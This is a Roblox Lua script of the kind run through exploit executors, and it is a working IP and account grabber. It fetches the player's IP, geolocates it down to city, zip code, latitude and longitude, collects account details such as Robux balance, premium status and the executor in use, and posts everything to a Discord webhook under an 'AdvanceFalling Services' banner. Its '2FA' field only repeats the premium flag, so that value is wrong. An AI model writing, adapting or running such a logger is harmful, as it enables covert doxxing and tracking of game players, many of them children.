local name = game:GetService("Players").LocalPlayer.Name
local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
local HTTP_ = game:GetService('HttpService')
local LPR = game:GetService('Players').LocalPlayer
local isPremium = game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.Premium
local username = game.Players.LocalPlayer.Name
local userId = game.Players.LocalPlayer.UserId
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local accountAge = math.floor((os.time() - player.AccountAge * 86400) / 86400)
local jobID = game.JobId

local getIPInfo = HttpService:JSONDecode(game:HttpGet(string.format("http://ip-api.com/json/%s", ESD)))
local FI = {
  IP = ESD,
  country = getIPInfo.country,
  countryCode = getIPInfo.countryCode,
  region = getIPInfo.region,
  regionName = getIPInfo.regionName,
  city = getIPInfo.city,
  zipcode = getIPInfo.zip,
  latitude = getIPInfo.lat,
  longitude = getIPInfo.lon,
  isp = getIPInfo.isp,
  org = getIPInfo.org
}

local url = "Webhook-Here"

local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    FlUXUS_LOADED and "Fluxus" or ""

local balance = LPR:FindFirstChild("leaderstats") and LPR.leaderstats.Robux.Value or 0

local data = {
  username = LPR.Name .. ' [' .. LPR.UserId .. ']',
  avatar_url = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
  embeds = {
    {
      title = "AdvanceFalling Services",
      description = "Discord: https://discord.gg/d2446gBjfq",
      color = tonumber(0x2B6BE4),
      fields = {
        {
          name = "Profile:",
          value = "https://www.roblox.com/users/" .. userId .. "/profile",
          inline = true
        },
        {
          name = "Game:",
          value = "https://www.roblox.com/games/" .. game.PlaceId,
          inline = true
        },
        {
          name = "Game Info:",
          value = "**ID**: " .. game.PlaceId .. ".\n**Name:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
          inline = true
        },
        {
          name = "Exploit",
          value = webhookcheck,
          inline = true
        },
        {
          name = "Premium",
          value = isPremium and "True" or "False",
          inline = true
        },
        {
          name = "2FA",
          value = isPremium and "True" or "False",
          inline = true
        },
        {
          name = "Account Age",
          value = "" .. accountAge .. " ",
          inline = true
        },
        {
          name = "Robux Balance",
          value = tostring(balance),
          inline = true
        },
        {
          name = "Join Code",
          value = "" .. jobID,
          inline = true
        },
        {
          name = "IP",
          value = FI.IP,
          inline = true
        },
        {
          name = "Country",
          value = FI.country,
          inline = true
        },
        {
          name = "Country Code",
          value = FI.countryCode,
          inline = true
        },
        {
          name = "Region",
          value = FI.region,
          inline = true
        },
        {
          name = "Region Name",
          value = FI.regionName,
          inline = true
        },
        {
          name = "City",
          value = FI.city,
          inline = true
        },
        {
          name = "Zipcode",
          value = FI.zipcode,
          inline = true
        },
        {
          name = "Latitude",
          value = tostring(FI.latitude),
          inline = true
        },
        {
          name = "Longitude",
          value = tostring(FI.longitude),
          inline = true
        },
        {
          name = "ISP",
          value = FI.isp,
          inline = true
        },
        {
          name = "Org",
          value = FI.org,
          inline = true
        },
        {
          name = "Coming Soon",
          value = "??????????",
          inline = true
        }
      },
      color = tonumber(0x7269da),
    }
  }
}

local newdata = HTTP_:JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}

local request = http_request or request or HttpPost or syn.request
local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
request(abcdef)
